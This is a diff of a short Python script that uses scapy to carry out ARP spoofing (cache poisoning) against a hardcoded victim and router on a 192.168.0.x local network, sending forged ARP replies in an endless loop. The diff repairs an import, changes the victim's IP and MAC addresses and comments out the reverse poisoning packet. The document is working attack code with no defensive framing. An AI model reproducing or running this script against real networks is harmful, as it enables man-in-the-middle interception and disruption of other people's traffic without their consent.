@@ -1,20 +1,20 @@
 #!/usr/bin/python
 # coding: utf-8
 
-from scapy.a
-ll import *
+from scapy.all import *
 import netaddr
 
 
 
 def poison(routerIP, victimIP, routerMAC, victimMAC):
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)/ICMP(type = 1,code=1))
+   # send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)/ICMP(type = 1,code=1))
 
 def identification():
-	victimIP = '192.168.0.107'
+	victimIP = '192.168.0.100'
 	routerIP = '192.168.0.1'
-	victimMAC = 'a4:17:31:99:a3:25'
+	#victimMAC = 'a4:17:31:99:a3:25'
+	victimMAC = '16:0a:64:63:bf:c5'
 	routerMAC = '64:76:ba:9e:67:26'
 	while 1:
 		poison(routerIP, victimIP, routerMAC, victimMAC)
